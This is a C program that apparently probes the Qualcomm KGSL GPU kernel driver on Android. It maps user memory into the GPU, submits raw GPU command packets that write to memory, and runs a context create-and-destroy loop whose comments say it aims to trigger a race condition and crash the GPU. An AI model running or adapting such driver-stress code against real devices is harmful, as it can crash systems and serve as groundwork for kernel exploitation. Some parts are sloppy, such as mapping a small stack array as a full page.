#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <errno.h>
#include <stdbool.h>

/* KGSL ioctl structs */
#define KGSL_IOC_TYPE 0x09

struct kgsl_map_user_mem {
    int fd;
    unsigned long gpuaddr;
    size_t len;
    size_t offset;
    unsigned long hostptr;
    unsigned int memtype;
    unsigned int flags;
};

struct kgsl_drawctxt_create {
    unsigned int flags;
    unsigned int drawctxt_id;
};

struct kgsl_drawctxt_destroy {
    unsigned int drawctxt_id;
};

struct kgsl_gpu_command {
    uint64_t flags;
    uint64_t cmdlist;
    unsigned int cmdsize;
    unsigned int numcmds;
    uint64_t objlist;
    unsigned int objsize;
    unsigned int numobjs;
    uint64_t synclist;
    unsigned int syncsize;
    unsigned int numsyncs;
    unsigned int context_id;
    unsigned int timestamp;
};

struct kgsl_command_object {
    uint64_t offset;
    uint64_t gpuaddr;
    uint64_t size;
    unsigned int flags;
    unsigned int id;
};

struct kgsl_ibdesc {
    uint64_t gpuaddr;
    uint64_t size;
    unsigned int flags;
};

#define KGSL_USER_MEM_TYPE_ADDR 0x00000002
#define KGSL_CMDLIST_IB 0x00000001U

#define IOCTL_KGSL_DRAWCTXT_CREATE _IOWR(KGSL_IOC_TYPE, 0x13, struct kgsl_drawctxt_create)
#define IOCTL_KGSL_DRAWCTXT_DESTROY _IOW(KGSL_IOC_TYPE, 0x14, struct kgsl_drawctxt_destroy)
#define IOCTL_KGSL_MAP_USER_MEM _IOWR(KGSL_IOC_TYPE, 0x15, struct kgsl_map_user_mem)
#define IOCTL_KGSL_GPU_COMMAND _IOWR(KGSL_IOC_TYPE, 0x4A, struct kgsl_gpu_command)

/* GPU command packet helpers */
#define CP_TYPE7_PKT(opcode, count) ((7 << 28) | ((opcode) << 16) | ((count) & 0x3FFF))
#define CP_NOP 0x10
#define CP_WAIT_FOR_IDLE 0x26
#define CP_WAIT_MEM_WRITES 0x12
#define CP_MEM_WRITE 0x3d
#define CP_SET_DRAW_STATE 0x43
#define CP_INDIRECT_BUFFER 0x3f
#define CP_WAIT_REG_MEM 0x3c

#define upper_32_bits(n) ((uint32_t)(((n) >> 16) >> 16))
#define lower_32_bits(n) ((uint32_t)(n))

static inline unsigned int cp_gpuaddr(uint32_t *cmds, uint64_t gpuaddr) {
    cmds[0] = lower_32_bits(gpuaddr);
    cmds[1] = upper_32_bits(gpuaddr);
    return 2;
}

int kgsl_ctx_create(int fd, uint32_t *ctx_id) {
    struct kgsl_drawctxt_create req = { .flags = 0x00001812 };
    int ret = ioctl(fd, IOCTL_KGSL_DRAWCTXT_CREATE, &req);
    if (ret) return ret;
    *ctx_id = req.drawctxt_id;
    return 0;
}

int kgsl_ctx_destroy(int fd, uint32_t ctx_id) {
    struct kgsl_drawctxt_destroy req = { .drawctxt_id = ctx_id };
    return ioctl(fd, IOCTL_KGSL_DRAWCTXT_DESTROY, &req);
}

int kgsl_map(int fd, unsigned long addr, size_t len, uint64_t *gpuaddr) {
    struct kgsl_map_user_mem req = {
        .len = len, .offset = 0, .hostptr = addr,
        .memtype = KGSL_USER_MEM_TYPE_ADDR,
    };
    int ret = ioctl(fd, IOCTL_KGSL_MAP_USER_MEM, &req);
    if (ret) return ret;
    *gpuaddr = req.gpuaddr;
    return 0;
}

int kgsl_gpu_command(int fd, uint32_t ctx_id, uint64_t payload_gpuaddr, uint32_t payload_size) {
    struct kgsl_command_object cmd = {
        .gpuaddr = payload_gpuaddr,
        .size = payload_size,
        .flags = KGSL_CMDLIST_IB,
    };
    struct kgsl_gpu_command req = {
        .cmdlist = (uint64_t)(unsigned long)&cmd,
        .cmdsize = sizeof(cmd),
        .numcmds = 1,
        .context_id = ctx_id,
        .timestamp = 1,
    };
    return ioctl(fd, IOCTL_KGSL_GPU_COMMAND, &req);
}

/* Build a simple GPU command buffer:
 * NOP, WAIT_FOR_IDLE, MEM_WRITE, WAIT_MEM_WRITES, NOP
 */
void build_gpu_payload(uint32_t *cmds, uint64_t write_addr, uint32_t write_val) {
    uint32_t *p = cmds;
    
    /* NOP */
    *p++ = CP_TYPE7_PKT(CP_NOP, 0);
    
    /* WAIT_FOR_IDLE */
    *p++ = CP_TYPE7_PKT(CP_WAIT_FOR_IDLE, 0);
    
    /* MEM_WRITE: write value to address */
    /* CP_MEM_WRITE with 2 dwords of header + 2 dwords addr + 1 dword value */
    *p++ = CP_TYPE7_PKT(CP_MEM_WRITE, 3);
    p += cp_gpuaddr(p, write_addr);
    *p++ = write_val;
    
    /* WAIT_MEM_WRITES - ensure write is complete */
    *p++ = CP_TYPE7_PKT(CP_WAIT_MEM_WRITES, 0);
    
    /* More NOPs */
    *p++ = CP_TYPE7_PKT(CP_NOP, 0);
    *p++ = CP_TYPE7_PKT(CP_NOP, 0);
}

int main() {
    int fd = open("/dev/kgsl-3d0", O_RDWR);
    if (fd < 0) {
        printf("[-] open: %s\n", strerror(errno));
        return 1;
    }
    printf("[+] fd=%d\n", fd);

    uint32_t ctx_id;
    if (kgsl_ctx_create(fd, &ctx_id)) {
        printf("[-] ctx create: %s\n", strerror(errno));
        close(fd);
        return 1;
    }
    printf("[+] ctx id=%u\n", ctx_id);

    /* === Test 1: Basic W/R via GPU mapping === */
    printf("\n=== Test 1: GPU memory write/read ===\n");
    
    /* Allocate a page for results */
    uint32_t *result_buf = mmap(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
    memset(result_buf, 0xAB, 4096);
    
    uint64_t result_gpuaddr;
    if (kgsl_map(fd, (unsigned long)result_buf, 4096, &result_gpuaddr)) {
        printf("[-] map result buf: %s\n", strerror(errno));
        goto cleanup;
    }
    printf("[+] result_buf: host=%p gpuaddr=0x%lx\n", result_buf, (unsigned long)result_gpuaddr);

    /* Prepare a GPU command that writes 0xDEADBEEF to result_buf[0] */
    uint32_t *payload = mmap(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
    build_gpu_payload(payload, result_gpuaddr, 0xDEADBEEF);
    
    uint64_t payload_gpuaddr;
    if (kgsl_map(fd, (unsigned long)payload, 4096, &payload_gpuaddr)) {
        printf("[-] map payload: %s\n", strerror(errno));
        goto cleanup;
    }
    printf("[+] payload: host=%p gpuaddr=0x%lx\n", payload, (unsigned long)payload_gpuaddr);

    /* Submit GPU command */
    printf("[*] submitting GPU command...\n");
    if (kgsl_gpu_command(fd, ctx_id, payload_gpuaddr, 4096)) {
        printf("[-] GPU command: %s\n", strerror(errno));
        goto cleanup;
    }
    printf("[+] GPU command submitted\n");

    /* Wait a bit and check the result */
    usleep(500000);

    printf("[*] result_buf[0]=0x%08x ", result_buf[0]);
    if (result_buf[0] == 0xDEADBEEF) {
        printf("✅ GPU wrote 0xDEADBEEF!\n");
    } else if (result_buf[0] == 0xABABABAB) {
        printf("❌ GPU didn't write (still 0xABABABAB)\n");
    } else {
        printf("⚠️  unexpected value\n");
    }
    
    /* === Test 2: Force GPU to use SMMU - try to crash GPU === */
    printf("\n=== Test 2: SMMU stress test ===\n");
    
    /* Create a second context and submit commands to it */
    uint32_t ctx_id2;
    if (kgsl_ctx_create(fd, &ctx_id2)) {
        printf("[-] ctx2 create: %s\n", strerror(errno));
    } else {
        printf("[+] ctx2 id=%u\n", ctx_id2);
        
        /* Map another buffer */
        uint32_t *buf2 = mmap(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
        memset(buf2, 0x42, 4096);
        uint64_t buf2_gpuaddr;
        if (kgsl_map(fd, (unsigned long)buf2, 4096, &buf2_gpuaddr) == 0) {
            printf("[+] buf2 mapped: gpuaddr=0x%lx\n", (unsigned long)buf2_gpuaddr);
            
            /* Submit commands to both contexts rapidly to trigger race condition */
            for (int i = 0; i < 10; i++) {
                struct kgsl_drawctxt_create ctx_tmp;
                memset(&ctx_tmp, 0, sizeof(ctx_tmp));
                ctx_tmp.flags = 0x00001812;
                if (ioctl(fd, IOCTL_KGSL_DRAWCTXT_CREATE, &ctx_tmp) == 0) {
                    uint32_t payload2[16];
                    memset(payload2, 0, sizeof(payload2));
                    payload2[0] = CP_TYPE7_PKT(CP_NOP, 0);
                    payload2[1] = CP_TYPE7_PKT(CP_WAIT_FOR_IDLE, 0);
                    
                    uint64_t tmp_gpuaddr;
                    if (kgsl_map(fd, (unsigned long)payload2, 4096, &tmp_gpuaddr) == 0) {
                        kgsl_gpu_command(fd, ctx_tmp.drawctxt_id, tmp_gpuaddr, 4096);
                    }
                    
                    struct kgsl_drawctxt_destroy d = { .drawctxt_id = ctx_tmp.drawctxt_id };
                    ioctl(fd, IOCTL_KGSL_DRAWCTXT_DESTROY, &d);
                }
                usleep(1000);
            }
            
            /* Check if device is still alive */
            uint32_t ctx_check;
            if (kgsl_ctx_create(fd, &ctx_check) == 0) {
                printf("[+] GPU still alive after context storm\n");
                struct kgsl_drawctxt_destroy d = { .drawctxt_id = ctx_check };
                ioctl(fd, IOCTL_KGSL_DRAWCTXT_DESTROY, &d);
            }
        }
        
        struct kgsl_drawctxt_destroy d2 = { .drawctxt_id = ctx_id2 };
        ioctl(fd, IOCTL_KGSL_DRAWCTXT_DESTROY, &d2);
    }

    /* === Test 3: Check if we can map more memory === */
    printf("\n=== Test 3: Large memory mapping ===\n");
    size_t large_size = 16 * 1024 * 1024; /* 16MB */
    void *large_buf = mmap(NULL, large_size, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
    if (large_buf == MAP_FAILED) {
        printf("[-] large mmap: %s\n", strerror(errno));
    } else {
        memset(large_buf, 0xCC, large_size);
        uint64_t large_gpuaddr;
        if (kgsl_map(fd, (unsigned long)large_buf, large_size, &large_gpuaddr)) {
            printf("[-] map large buf: %s\n", strerror(errno));
        } else {
            printf("[+] 16MB mapped: gpuaddr=0x%lx\n", (unsigned long)large_gpuaddr);
        }
    }

cleanup:
    struct kgsl_drawctxt_destroy d = { .drawctxt_id = ctx_id };
    ioctl(fd, IOCTL_KGSL_DRAWCTXT_DESTROY, &d);
    close(fd);
    printf("\n[+] DONE\n");
    return 0;
}